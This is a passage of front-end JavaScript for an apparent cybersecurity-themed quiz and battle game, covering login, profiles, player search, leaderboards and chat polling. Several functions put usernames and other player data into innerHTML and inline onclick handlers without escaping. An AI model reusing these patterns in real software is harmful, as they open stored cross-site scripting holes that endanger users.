      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        roomId: state.battle.activeRoom.id,
        username: state.account.username,
        text,
        type: 'chat'
      })
    });
    const data = await res.json();
    if (data.success && data.room) {
      state.battle.activeRoom = data.room;
      renderBattleChatMessages(data.room.chatMessages || []);
    }
  } catch (e) {}
}

function startRoundTimer() {
  clearInterval(state.battle.roundTimer);
  state.battle.timeLeft = 12;
  const timerBox = document.getElementById('combatTimerBox');

  state.battle.roundTimer = setInterval(() => {
    state.battle.timeLeft--;
    if (timerBox) timerBox.textContent = state.battle.timeLeft;

    if (state.battle.timeLeft <= 0) {
      clearInterval(state.battle.roundTimer);
      // Auto-submit timeout move if not answered
      if (state.battle.activeRoom && state.battle.activeRoom.status === 'BATTLING') {
        submitCombatMove(state.battle.activeRoom.currentRoundIdx, -1);
      }
    }
  }, 1000);
}

async function submitCombatMove(roundIdx, answerIdx) {
  sounds.laserShoot();
  haptic('hit');
  triggerLaserShot();

  try {
    const res = await fetch(API_BASE + '/api/cyber/battle/submit-move', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        roomId: state.battle.activeRoom.id,
        username: state.account.username,
        roundIdx,
        answerIdx
      })
    });

    const data = await res.json();
    if (data.success && data.room) {
      state.battle.activeRoom = data.room;
      renderBattleUI(data.room);
      startRoundTimer();

      if (data.room.status === 'FINISHED') {
        clearInterval(state.battle.pollTimer);
        clearInterval(state.battle.roundTimer);
        setTimeout(() => showBattleVictory(data.room), 700);
      }
    }
  } catch (err) {
    console.error('Submit move error:', err);
  }
}

function triggerLaserShot() {
  const overlay = document.getElementById('laserOverlay');
  if (!overlay) return;
  const laser = document.createElement('div');
  laser.className = 'laser-strike';
  laser.style.top = '40%';
  laser.style.left = '10%';
  laser.style.width = '80%';
  overlay.appendChild(laser);
  setTimeout(() => laser.remove(), 550);
}

function showBattleVictory(room) {
  const isWinner = room.winner.toLowerCase() === state.account.username.toLowerCase();
  const isDraw = room.winner === 'DRAW';

  if (isWinner) {
    sounds.victory();
    haptic('win');
    triggerConfetti();
    document.getElementById('victoryIcon').textContent = '🏆';
    document.getElementById('victoryTitle').textContent = 'VICTORY ACHIEVED!';
    document.getElementById('victorySubtitle').textContent = 'Opponent firewall neutralized. Competitive rating increased!';
    document.getElementById('victoryTrophies').textContent = '+30 🏆';
    document.getElementById('victoryXP').textContent = '+100 ⚡';
  } else if (isDraw) {
    document.getElementById('victoryIcon').textContent = '⚖️';
    document.getElementById('victoryTitle').textContent = 'TACTICAL DRAW';
    document.getElementById('victorySubtitle').textContent = 'Mutual counter-measures balanced. No rating change.';
    document.getElementById('victoryTrophies').textContent = '+0 🏆';
    document.getElementById('victoryXP').textContent = '+25 ⚡';
  } else {
    sounds.wrong();
    haptic('hit');
    document.getElementById('victoryIcon').textContent = '💥';
    document.getElementById('victoryTitle').textContent = 'FIREWALL BREACHED';
    document.getElementById('victorySubtitle').textContent = `Victor: ${room.winner}. Analyze logs and adapt your defense.`;
    document.getElementById('victoryTrophies').textContent = '-15 🏆';
    document.getElementById('victoryXP').textContent = '+10 ⚡';
  }

  // Refresh user account after match result
  checkAndFetchServerProfile();

  document.getElementById('battleCombatScreen').classList.add('hidden');
  document.getElementById('battleVictoryModal').classList.remove('hidden');
}

function returnToArenaLobby() {
  clearInterval(state.battle.pollTimer);
  clearInterval(state.battle.roundTimer);
  document.getElementById('battleVictoryModal').classList.add('hidden');
  document.getElementById('battleCombatScreen').classList.add('hidden');
  document.getElementById('battleArenaLobby').classList.remove('hidden');
}

// ============ USER ACCOUNT & AUTHENTICATION ============
function openAuthModal() {
  sounds.click();
  document.getElementById('authModal').classList.remove('hidden');
}

function closeAuthModal() {
  document.getElementById('authModal').classList.add('hidden');
}

function continueAsGuest() {
  sounds.click();
  closeAuthModal();
}

function switchAuthTab(tab) {
  sounds.click();
  state.authTab = tab;
  const isReg = tab === 'register';

  document.getElementById('authTabRegisterBtn').className = isReg
    ? 'py-2.5 rounded-lg bg-cyan-500 text-slate-950 font-bold transition-all flex items-center justify-center gap-1.5'
    : 'py-2.5 rounded-lg text-slate-400 hover:text-white transition-all flex items-center justify-center gap-1.5';

  document.getElementById('authTabLoginBtn').className = !isReg
    ? 'py-2.5 rounded-lg bg-cyan-500 text-slate-950 font-bold transition-all flex items-center justify-center gap-1.5'
    : 'py-2.5 rounded-lg text-slate-400 hover:text-white transition-all flex items-center justify-center gap-1.5';

  document.getElementById('regForm').classList.toggle('hidden', !isReg);
  document.getElementById('loginForm').classList.toggle('hidden', isReg);
}

function selectAuthGender(gender) {
  sounds.click();
  state.authSelectedGender = gender;
  const isMale = gender === 'male';

  const maleBtn = document.getElementById('genderMaleBtn');
  const femaleBtn = document.getElementById('genderFemaleBtn');

  if (isMale) {
    maleBtn.className = 'p-2.5 rounded-xl border-2 border-cyan-400 bg-cyan-500/20 text-cyan-300 font-bold flex items-center justify-center gap-2';
    femaleBtn.className = 'p-2.5 rounded-xl border border-slate-700 bg-slate-900 text-slate-400 font-bold flex items-center justify-center gap-2';
    if (!state.authUploadedPhoto) {
      document.getElementById('authPhotoPreviewIcon').textContent = '👨‍💻';
    }
  } else {
    maleBtn.className = 'p-2.5 rounded-xl border border-slate-700 bg-slate-900 text-slate-400 font-bold flex items-center justify-center gap-2';
    femaleBtn.className = 'p-2.5 rounded-xl border-2 border-pink-400 bg-pink-500/20 text-pink-300 font-bold flex items-center justify-center gap-2';
    if (!state.authUploadedPhoto) {
      document.getElementById('authPhotoPreviewIcon').textContent = '👩‍💻';
    }
  }
}

async function handleAuthPhotoUploaded(file) {
  if (!file) return;
  sounds.click();
  try {
    const dataUrl = await compressImage(file, 128);
    state.authUploadedPhoto = dataUrl;
    const box = document.getElementById('authPhotoPreviewBox');
    box.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover rounded-full" alt="Profile Preview">`;
    document.getElementById('authPhotoName').textContent = file.name || 'Photo selected';
  } catch (err) {
    alert(err.message || 'Failed to process image.');
  }
}

let selectedPresetAvatar = '👨‍💻';
function initAvatarPickers() {
  const avatars = ['👨‍💻', '👩‍💻', '🔰', '🕵️‍♂️', '⚡', '🛡️', '🦅', '💀', '🧬', '🚀'];
  const container = document.getElementById('authAvatarPicker');
  if (!container) return;
  container.innerHTML = avatars.map((av, i) => `
    <button type="button" onclick="chooseAuthAvatar('${av}', this)" class="avatar-cell p-2 rounded-lg border border-slate-700 bg-slate-800 text-center hover:border-cyan-400 transition-all ${i === 0 ? 'border-cyan-400 bg-cyan-500/20' : ''}">
      ${av}
    </button>
  `).join('');
}

function chooseAuthAvatar(av, btn) {
  selectedPresetAvatar = av;
  state.authUploadedPhoto = null; // Clear uploaded photo if selecting preset
  document.getElementById('authPhotoPreviewBox').innerHTML = `<span id="authPhotoPreviewIcon" class="text-2xl">${av}</span>`;
  document.getElementById('authPhotoName').textContent = 'Preset avatar selected';
  document.querySelectorAll('.avatar-cell').forEach(b => b.classList.remove('border-cyan-400', 'bg-cyan-500/20'));
  btn.classList.add('border-cyan-400', 'bg-cyan-500/20');
}

// Register Submission
async function handleRegisterSubmit(e) {
  e.preventDefault();
  sounds.click();
  const username = document.getElementById('regUsernameInput').value.trim();
  const pin = document.getElementById('regPinInput').value.trim();
  const division = document.getElementById('regDivisionSelect').value;
  const avatar = state.authUploadedPhoto || selectedPresetAvatar;
  const gender = state.authSelectedGender;
  const securityQuestion = document.getElementById('regSecQuestionSelect') ? document.getElementById('regSecQuestionSelect').value : '';
  const securityAnswer = document.getElementById('regSecAnswerInput') ? document.getElementById('regSecAnswerInput').value.trim() : '';

  try {
    const res = await fetch(API_BASE + '/api/cyber/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username,
        pin,
        division,
        avatar,
        gender,
        securityQuestion,
        securityAnswer
      })
    });

    const data = await res.json();
    if (data.success && data.profile) {
      applySignedInProfile(data.profile);
      if (data.profile.recoveryKey) {
        showRecoveryKeyModal(data.profile.recoveryKey);
      } else {
        alert(`🎉 Welcome, Operative ${data.profile.username}! Your persistent CyberGameS account is created.`);
      }
    } else {
      alert(data.error || 'Registration failed.');
    }
  } catch (err) {
    alert('Server network error. Please try again.');
  }
}

// Login Submission
async function handleLoginSubmit(e) {
  e.preventDefault();
  sounds.click();
  const username = document.getElementById('loginUsernameInput').value.trim();
  const pin = document.getElementById('loginPinInput').value.trim();

  try {
    const res = await fetch(API_BASE + '/api/cyber/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, pin })
    });

    const data = await res.json();
    if (data.success && data.profile) {
      applySignedInProfile(data.profile);
      alert(`🔑 Welcome back, Operative ${data.profile.username}!`);
    } else {
      alert(data.error || 'Login failed. Invalid username or PIN.');
    }
  } catch (err) {
    alert('Server network error. Please try again.');
  }
}

function applySignedInProfile(profile) {
  state.account = {
    ...state.account,
    username: profile.username,
    gender: profile.gender || 'male',
    avatar: profile.avatar || '👨‍💻',
    division: profile.division || 'Dhaka',
    level4Completed: !!profile.level4Completed,
    completedMissions: profile.completedMissions || [],
    xp: profile.xp || 0,
    trophies: profile.trophies || 100,
    rank: profile.rank || 'Script Kiddie',
    battles: profile.battles || { total: 0, wins: 0, losses: 0 }
  };

  saveLocalAccount();
  syncLocalProfileHUD();
  closeAuthModal();
  checkCombatGate();
  renderProfileStats();

  sounds.correct();
  triggerConfetti();
}

// Profile Photo Update inside Profile Tab
function triggerProfilePhotoPicker() {
  sounds.click();
  const input = document.getElementById('profilePhotoPickerInput');
  if (input) input.click();
}

async function handleProfilePhotoSelected(file) {
  if (!file) return;
  sounds.click();
  try {
    const dataUrl = await compressImage(file, 128);
    state.account.avatar = dataUrl;
    saveLocalAccount();
    syncLocalProfileHUD();
    renderProfileStats();

    // Sync to server if registered account
    if (state.account.username && !state.account.username.startsWith('Guest_')) {
      await fetch(API_BASE + '/api/cyber/profile/update-avatar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: state.account.username,
          avatar: dataUrl
        })
      });
    }

    sounds.correct();
    alert('📸 Profile photo successfully updated!');
  } catch (err) {
    alert(err.message || 'Failed to update profile photo.');
  }
}

async function toggleUserGender() {
  sounds.click();
  const newGender = state.account.gender === 'male' ? 'female' : 'male';
  state.account.gender = newGender;
  saveLocalAccount();
  syncLocalProfileHUD();
  renderProfileStats();

  if (state.account.username && !state.account.username.startsWith('Guest_')) {
    try {
      await fetch(API_BASE + '/api/cyber/profile/update-gender', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: state.account.username,
          gender: newGender
        })
      });
    } catch (e) {}
  }
}

async function checkAndFetchServerProfile() {
  if (!state.account.username || state.account.username.startsWith('Guest_')) return;
  try {
    const res = await fetch(API_BASE + `/api/cyber/profile/${encodeURIComponent(state.account.username)}`);
    if (res.ok) {
      const data = await res.json();
      if (data.success && data.profile) {
        state.account.avatar = data.profile.avatar || state.account.avatar;
        state.account.gender = data.profile.gender || state.account.gender;
        state.account.division = data.profile.division || state.account.division;
        state.account.xp = data.profile.xp;
        state.account.trophies = data.profile.trophies;
        state.account.level4Completed = data.profile.level4Completed;
        state.account.rank = data.profile.rank;
        state.account.battles = data.profile.battles;
        saveLocalAccount();
        syncLocalProfileHUD();
        checkCombatGate();
      }
    }
  } catch (e) {}
}

function saveLocalAccount() {
  localStorage.setItem('cyber_user', state.account.username);
  localStorage.setItem('cyber_gender', state.account.gender);
  localStorage.setItem('cyber_avatar', state.account.avatar);
  localStorage.setItem('cyber_division', state.account.division);
  localStorage.setItem('cyber_l4_done', state.account.level4Completed ? 'true' : 'false');
  localStorage.setItem('cyber_missions', JSON.stringify(state.account.completedMissions));
  localStorage.setItem('cyber_xp', state.account.xp);
  localStorage.setItem('cyber_trophies', state.account.trophies);
}

function syncLocalProfileHUD() {
  const hudAvatar = document.getElementById('hudAvatar');
  if (hudAvatar) hudAvatar.innerHTML = renderAvatarHTML(state.account.avatar, "w-full h-full");

  const hudUser = document.getElementById('hudUsername');
  if (hudUser) hudUser.textContent = state.account.username;

  const hudGender = document.getElementById('hudGenderBadge');
  if (hudGender) {
    hudGender.innerHTML = state.account.gender === 'female' ? '♀️' : '♂️';
    hudGender.className = state.account.gender === 'female'
      ? 'text-[9px] font-bold px-1.5 py-0.2 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/40'
      : 'text-[9px] font-bold px-1.5 py-0.2 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/40';
  }

  const hudTro = document.getElementById('hudTrophies');
  if (hudTro) hudTro.textContent = state.account.trophies;

  const hudXp = document.getElementById('hudXP');
  if (hudXp) hudXp.textContent = state.account.xp.toLocaleString();

  const hudLic = document.getElementById('hudLicenseBadge');
  if (hudLic) {
    hudLic.textContent = state.account.level4Completed ? 'LICENSED' : 'LVL 1';
    hudLic.className = state.account.level4Completed
      ? 'text-[8px] font-orbitron px-1 py-0.2 rounded bg-emerald-500/20 text-emerald-300 font-bold'
      : 'text-[8px] font-orbitron px-1 py-0.2 rounded bg-amber-500/20 text-amber-300 font-bold';
  }
}

function renderProfileStats() {
  const profAvatar = document.getElementById('profAvatar');
  if (profAvatar) profAvatar.innerHTML = renderAvatarHTML(state.account.avatar, "w-full h-full");

  const profUser = document.getElementById('profUsername');
  if (profUser) profUser.textContent = state.account.username;

  const profGenderBadge = document.getElementById('profGenderBadge');
  if (profGenderBadge) {
    profGenderBadge.innerHTML = state.account.gender === 'female' ? '♀️ Female' : '♂️ Male';
    profGenderBadge.className = state.account.gender === 'female'
      ? 'text-xs font-mono-cyber bg-pink-500/20 text-pink-300 border border-pink-500/40 px-2 py-0.5 rounded-full font-bold'
      : 'text-xs font-mono-cyber bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full font-bold';
  }

  const toggleBtnText = document.getElementById('profGenderToggleBtnText');
  if (toggleBtnText) {
    toggleBtnText.textContent = state.account.gender === 'female' ? 'Switch to Male ♂️' : 'Switch to Female ♀️';
  }

  document.getElementById('profRank').textContent = state.account.rank;
  document.getElementById('profDivision').textContent = `Division: ${state.account.division} • Bangladesh`;
  document.getElementById('profTrophies').textContent = state.account.trophies;
  document.getElementById('profXP').textContent = state.account.xp.toLocaleString();

  const b = state.account.battles || { total: 0, wins: 0, losses: 0 };
  document.getElementById('profWins').textContent = b.wins || 0;
  document.getElementById('profLosses').textContent = b.losses || 0;
  const rate = b.total > 0 ? Math.round((b.wins / b.total) * 100) : 0;
  document.getElementById('profWinRate').textContent = `${rate}%`;
  document.getElementById('profMissions').textContent = `${state.account.completedMissions.length} / 20`;

  // Render recent matches
  const matchHist = b.matchHistory || [];
  const histContainer = document.getElementById('profMatchHistory');
  if (matchHist.length === 0) {
    histContainer.innerHTML = `<div class="text-slate-500 text-center py-4">No 1v1 battles fought yet. Enter the Arena to battle!</div>`;
  } else {
    histContainer.innerHTML = matchHist.map(m => `
      <div class="flex items-center justify-between p-2.5 rounded-lg ${m.outcome === 'WIN' ? 'bg-emerald-500/10 border border-emerald-500/30' : 'bg-rose-500/10 border border-rose-500/30'}">
        <span class="font-bold ${m.outcome === 'WIN' ? 'text-emerald-400' : 'text-rose-400'}">${m.outcome}</span>
        <span class="text-slate-300">vs ${m.opponent}</span>
        <span class="font-bold ${m.trophiesChanged > 0 ? 'text-amber-400' : 'text-slate-400'}">${m.trophiesChanged > 0 ? '+' : ''}${m.trophiesChanged} 🏆</span>
      </div>
    `).join('');
  }
}

// ============ REAL-TIME PLAYER SEARCH & DOSSIER ============
let searchTimer = null;
function handlePlayerSearch(val) {
  clearTimeout(searchTimer);
  const dropdown = document.getElementById('searchResultsDropdown');
  if (!val || val.trim().length < 2) {
    dropdown.classList.add('hidden');
    return;
  }

  searchTimer = setTimeout(async () => {
    try {
      const res = await fetch(API_BASE + `/api/cyber/search?q=${encodeURIComponent(val.trim())}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.success && data.results) {
        if (data.results.length === 0) {
          dropdown.innerHTML = `<div class="text-slate-500 text-center py-2">No operative found</div>`;
        } else {
          dropdown.innerHTML = data.results.map(p => `
            <div onclick="openDossierModal('${p.username}')" class="flex items-center justify-between p-2 rounded-lg hover:bg-slate-900 cursor-pointer transition-all">
              <div class="flex items-center gap-2">
                <div class="w-6 h-6 rounded-full overflow-hidden flex items-center justify-center bg-slate-800">
                  ${renderAvatarHTML(p.avatar, "w-full h-full")}
                </div>
                <span class="font-bold text-white">${p.username}</span>
                ${renderGenderBadge(p.gender)}
                <span class="text-[10px] text-slate-500">(${p.division})</span>
              </div>
              <span class="text-amber-400 font-bold">${p.trophies} 🏆</span>
            </div>
          `).join('');
        }
        dropdown.classList.remove('hidden');
      }
    } catch (e) {}
  }, 250);
}

// Close search dropdown on click outside
document.addEventListener('click', (e) => {
  const dropdown = document.getElementById('searchResultsDropdown');
  if (dropdown && !e.target.closest('#playerSearchInput')) {
    dropdown.classList.add('hidden');
  }
});

let dossierCurrentPlayer = null;
async function openDossierModal(username) {
  sounds.click();
  try {
    const res = await fetch(API_BASE + `/api/cyber/profile/${encodeURIComponent(username)}`);
    if (!res.ok) return;
    const data = await res.json();
    if (data.success && data.profile) {
      const p = data.profile;
      dossierCurrentPlayer = p;
      document.getElementById('dossierAvatar').innerHTML = renderAvatarHTML(p.avatar, "w-full h-full");
      document.getElementById('dossierUsername').textContent = p.username;
      const genEl = document.getElementById('dossierGenderBadge');
      if (genEl) genEl.innerHTML = p.gender === 'female' ? '♀️ Female' : '♂️ Male';
      document.getElementById('dossierRank').textContent = p.rank;
      document.getElementById('dossierDivision').textContent = `Division: ${p.division} • Bangladesh`;
      document.getElementById('dossierTrophies').textContent = `${p.trophies} 🏆`;

      const b = p.battles || { total: 0, wins: 0 };
      const winRate = b.total > 0 ? Math.round((b.wins / b.total) * 100) : 0;
      document.getElementById('dossierWinRate').textContent = `${winRate}%`;

      document.getElementById('dossierModal').classList.remove('hidden');
    }
  } catch (e) {}
}

function closeDossierModal() {
  document.getElementById('dossierModal').classList.add('hidden');
}

function challengeDossierPlayer() {
  if (!dossierCurrentPlayer) return;
  sounds.click();
  closeDossierModal();
  switchMainTab('battle');
  startQuickMatch();
}

// ============ LEADERBOARDS ============
function toggleLeaderboardType(type) {
  sounds.click();
  state.leaderboardType = type;
  document.getElementById('lbTrophyBtn').className = type === 'trophies' ? 'px-3 py-1 rounded bg-amber-500 text-slate-950 font-bold' : 'px-3 py-1 rounded text-slate-400 hover:text-white';
  document.getElementById('lbXPBtn').className = type === 'xp' ? 'px-3 py-1 rounded bg-cyan-500 text-slate-950 font-bold' : 'px-3 py-1 rounded text-slate-400 hover:text-white';
  document.getElementById('lbMetricHeader').textContent = type === 'trophies' ? 'TROPHIES 🏆' : 'EXPERIENCE ⚡';
  fetchTrophyLeaderboard();
}

async function fetchTrophyLeaderboard() {
  try {
    const res = await fetch(API_BASE + '/api/cyber/trophy-leaderboard');
    if (!res.ok) return;
    const data = await res.json();
    if (data.success && data.leaderboard) {
      renderLeaderboard(data.leaderboard);
    }
  } catch (e) {}
}

function renderLeaderboard(players) {
  const tbody = document.getElementById('leaderboardTableBody');
  if (state.leaderboardType === 'xp') {
    players.sort((a, b) => (b.xp || 0) - (a.xp || 0));
  } else {
    players.sort((a, b) => (b.trophies || 100) - (a.trophies || 100));
  }

  tbody.innerHTML = players.map((p, idx) => {
    const isMe = p.username.toLowerCase() === state.account.username.toLowerCase();
    const rankMedal = idx === 0 ? '🥇' : idx === 1 ? '🥈' : idx === 2 ? '🥉' : `#${idx + 1}`;
    const metric = state.leaderboardType === 'trophies' ? `${p.trophies} 🏆` : `${(p.xp || 0).toLocaleString()} ⚡`;

    return `
      <tr class="hover:bg-slate-900/60 transition-all ${isMe ? 'bg-cyan-500/10 font-bold' : ''}">
        <td class="py-3 px-3 font-orbitron ${idx < 3 ? 'text-amber-400 font-bold text-sm' : 'text-slate-400'}">${rankMedal}</td>
        <td class="py-3 px-3">
          <div class="flex items-center gap-2">
            <div class="w-7 h-7 rounded-full overflow-hidden flex items-center justify-center bg-slate-800 border border-slate-700">
              ${renderAvatarHTML(p.avatar, "w-full h-full")}
            </div>
            <div>
              <div class="flex items-center gap-1.5">
                <span class="text-white ${isMe ? 'text-cyan-300' : ''}">${p.username}</span>
                ${renderGenderBadge(p.gender)}
              </div>
              <span class="text-[10px] text-slate-500">${p.rank}</span>
            </div>
          </div>
        </td>
        <td class="py-3 px-3 text-slate-400">${p.division}</td>
        <td class="py-3 px-3 text-right font-orbitron font-bold text-amber-400">${metric}</td>
        <td class="py-3 px-3 text-right">
          <button onclick="openDossierModal('${p.username}')" class="px-2.5 py-1 rounded bg-cyan-500/20 text-cyan-300 hover:bg-cyan-500/30 text-[10px] font-bold">
            Dossier
          </button>
        </td>
      </tr>
    `;
  }).join('');
}

// ============ CYBER CREDENTIAL ID BADGE EXPORT ============
function generateHackerBadge() {
  sounds.click();
  const modal = document.getElementById('badgeModal');
  modal.classList.remove('hidden');

  const canvas = document.getElementById('idCardCanvas');
  const ctx = canvas.getContext('2d');

  // Background
  const grad = ctx.createLinearGradient(0, 0, 600, 340);
  grad.addColorStop(0, '#030712');
  grad.addColorStop(1, '#082f49');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, 600, 340);

  // Border & Grid
  ctx.strokeStyle = state.account.gender === 'female' ? '#ec4899' : '#06b6d4';
  ctx.lineWidth = 3;
  ctx.strokeRect(10, 10, 580, 320);

  // Holographic watermark
  ctx.strokeStyle = 'rgba(6, 182, 212, 0.08)';
  ctx.lineWidth = 1;
  for (let i = 20; i < 600; i += 25) {
    ctx.beginPath();
    ctx.moveTo(i, 10);
    ctx.lineTo(i, 330);
    ctx.stroke();
  }

  // Header Title
  ctx.fillStyle = '#ffffff';
  ctx.font = 'bold 18px "Orbitron", monospace';
  ctx.fillText('SENTINELX CYBER DEFENSE LAB', 30, 45);

  ctx.fillStyle = state.account.gender === 'female' ? '#ec4899' : '#06b6d4';
  ctx.font = 'bold 11px "Fira Code", monospace';
  ctx.fillText('OFFICIAL CERTIFIED CYBER OPERATIVE CREDENTIAL', 30, 65);

  // Divider
  ctx.strokeStyle = 'rgba(255, 255, 255, 0.2)';
  ctx.beginPath();
  ctx.moveTo(30, 80);
  ctx.lineTo(570, 80);
  ctx.stroke();

  // Photo / Avatar Frame
  ctx.fillStyle = '#0f172a';
  ctx.fillRect(35, 100, 110, 110);
  ctx.strokeStyle = state.account.gender === 'female' ? '#ec4899' : '#06b6d4';
  ctx.lineWidth = 2;
  ctx.strokeRect(35, 100, 110, 110);

  // Avatar text or image placeholder
  ctx.fillStyle = '#ffffff';
  ctx.font = '48px serif';
  ctx.textAlign = 'center';
  ctx.fillText(state.account.avatar && !state.account.avatar.startsWith('data:') ? state.account.avatar : '🔰', 90, 172);
  ctx.textAlign = 'left';

  // Operative Details
  ctx.fillStyle = '#94a3b8';
  ctx.font = '10px "Fira Code", monospace';
  ctx.fillText('CALL SIGN:', 170, 115);
  ctx.fillStyle = '#ffffff';
  ctx.font = 'bold 18px "Orbitron", monospace';
  ctx.fillText(state.account.username, 170, 138);

  ctx.fillStyle = '#94a3b8';
  ctx.font = '10px "Fira Code", monospace';
  ctx.fillText('GENDER / DIVISION:', 170, 165);
  ctx.fillStyle = state.account.gender === 'female' ? '#f472b6' : '#38bdf8';
  ctx.font = 'bold 12px "Fira Code", monospace';
  const genStr = state.account.gender === 'female' ? 'FEMALE (♀)' : 'MALE (♂)';
  ctx.fillText(`${genStr} • ${state.account.division} Division, BD`, 170, 183);

  ctx.fillStyle = '#94a3b8';
  ctx.font = '10px "Fira Code", monospace';
  ctx.fillText('SECURITY RANK:', 170, 210);
  ctx.fillStyle = '#10b981';
  ctx.font = 'bold 13px "Orbitron", monospace';
  ctx.fillText(state.account.rank, 170, 228);

  // Footer Row Stats
  ctx.fillStyle = '#0f172a';
  ctx.fillRect(30, 255, 540, 55);
  ctx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
  ctx.strokeRect(30, 255, 540, 55);

  ctx.fillStyle = '#fbbf24';
  ctx.font = 'bold 12px "Orbitron", monospace';
  ctx.fillText(`🏆 TROPHIES: ${state.account.trophies}`, 45, 288);

  ctx.fillStyle = '#38bdf8';
  ctx.fillText(`⚡ XP: ${state.account.xp}`, 210, 288);

  ctx.fillStyle = state.account.level4Completed ? '#34d399' : '#f87171';
  ctx.fillText(`COMBAT LICENSE: ${state.account.level4Completed ? 'VERIFIED' : 'PENDING'}`, 360, 288);
}

function closeBadgeModal() {
  document.getElementById('badgeModal').classList.add('hidden');
}

function downloadIdBadge() {
  sounds.click();
  const canvas = document.getElementById('idCardCanvas');
  const a = document.createElement('a');
  a.download = `SentinelX_Badge_${state.account.username}.png`;
  a.href = canvas.toDataURL('image/png');
  a.click();
}

function shareIdBadge() {
  sounds.click();
  if (navigator.share) {
    navigator.share({
      title: 'SentinelX Cyber Defense Credential',
      text: `I am Operative ${state.account.username} on SentinelX CyberGameS! Challenge me to a 1v1 duel!`,
      url: window.location.href
    }).catch(() => {});
  } else {
    navigator.clipboard.writeText(window.location.href);
    alert('Link copied to clipboard! Share with your friends.');
  }
}

// ============ PWA PROMPT SETUP ============
let deferredInstallPrompt = null;
function setupPwaPrompt() {
  window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredInstallPrompt = e;
    const bar = document.getElementById('pwa-install-bar');
    if (bar) bar.classList.remove('hidden');
  });

  const btn = document.getElementById('pwa-install-btn');
  if (btn) {
    btn.onclick = async () => {
      sounds.click();
      if (deferredInstallPrompt) {
        deferredInstallPrompt.prompt();
        const { outcome } = await deferredInstallPrompt.userChoice;
        if (outcome === 'accepted') {
          document.getElementById('pwa-install-bar').classList.add('hidden');
        }
        deferredInstallPrompt = null;
      } else {
        alert('To Install App:\n- On Android: Tap Chrome menu (⋮) -> Install App\n- On iPhone: Tap Share (⎙) -> Add to Home Screen');
      }
    };
  }

  const dismiss = document.getElementById('pwa-dismiss-btn');
  if (dismiss) {
    dismiss.onclick = () => document.getElementById('pwa-install-bar').classList.add('hidden');
  }
}

// ============ MATRIX RAIN CANVAS ============
function initMatrixCanvas() {
  const canvas = document.getElementById('matrix-canvas');
  if (!canvas || !canvas.getContext) return;
  const ctx = canvas.getContext('2d');
  if (!ctx) return;

  function resize() {
    canvas.width = (typeof window !== 'undefined' && window.innerWidth) ? window.innerWidth : 800;
    canvas.height = (typeof window !== 'undefined' && window.innerHeight) ? window.innerHeight : 600;
  }
  resize();
  if (typeof window !== 'undefined' && window.addEventListener) {
    window.addEventListener('resize', resize);
  }

  const chars = '01#@%&*ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const fontSize = 14;
  const canvasW = canvas.width || 800;
  let cols = Math.max(1, Math.floor(canvasW / fontSize));
  let drops = Array(cols).fill(1);

  setInterval(() => {
    try {
      ctx.fillStyle = 'rgba(3, 7, 18, 0.06)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#06b6d4';
      ctx.font = `${fontSize}px "Fira Code", monospace`;

      for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    } catch (e) {}
  }, 45);
}



// ==========================================
// 📡 CYBER COMMS & SOCIAL NETWORKING ENGINE
// ==========================================

function initCommsHub() {
  refreshGlobalComms();
  refreshConnectionsList();
  startCommsPolling();
}

function startCommsPolling() {
  stopCommsPolling();
  state.comms.pollTimer = setInterval(() => {
    if (state.activeTab !== 'comms') return;
    if (state.comms.activeChannel === 'global') {
      refreshGlobalComms(true);
    } else if (state.comms.activeChannel === 'direct' && state.comms.directRecipient) {
      refreshDirectComms(state.comms.directRecipient, true);
    }
  }, 2500);
}

function stopCommsPolling() {
  if (state.comms.pollTimer) {
    clearInterval(state.comms.pollTimer);
    state.comms.pollTimer = null;
  }
}

function switchCommsChannel(channel) {
  sounds.click();
  state.comms.activeChannel = channel;

  const btnGlobal = document.getElementById('subCommsGlobalBtn');
  const btnDirect = document.getElementById('subCommsDirectBtn');
  const btnNet = document.getElementById('subCommsNetworkBtn');

  if (btnGlobal) btnGlobal.className = channel === 'global' ? 'px-3 py-1.5 rounded-lg bg-cyan-500 text-slate-950 font-bold transition-all flex items-center gap-1.5' : 'px-3 py-1.5 rounded-lg text-slate-400 hover:text-white transition-all flex items-center gap-1.5';
  if (btnDirect) btnDirect.className = channel === 'direct' ? 'px-3 py-1.5 rounded-lg bg-purple-500 text-slate-950 font-bold transition-all flex items-center gap-1.5' : 'px-3 py-1.5 rounded-lg text-slate-400 hover:text-white transition-all flex items-center gap-1.5';
  if (btnNet) btnNet.className = channel === 'network' ? 'px-3 py-1.5 rounded-lg bg-emerald-500 text-slate-950 font-bold transition-all flex items-center gap-1.5' : 'px-3 py-1.5 rounded-lg text-slate-400 hover:text-white transition-all flex items-center gap-1.5';

  document.getElementById('commsGlobalChannel').classList.toggle('hidden', channel !== 'global');
  document.getElementById('commsDirectChannel').classList.toggle('hidden', channel !== 'direct');
  document.getElementById('commsNetworkChannel').classList.toggle('hidden', channel !== 'network');

  if (channel === 'global') refreshGlobalComms();
  if (channel === 'network') refreshConnectionsList();
  if (channel === 'direct' && state.comms.directRecipient) refreshDirectComms(state.comms.directRecipient);
}

// Global Comms Feed
let lastGlobalMsgCount = 0;
async function refreshGlobalComms(isSilent = false) {
  try {
    const res = await fetch(API_BASE + '/api/cyber/comms/global');
    if (!res.ok) return;
    const data = await res.json();
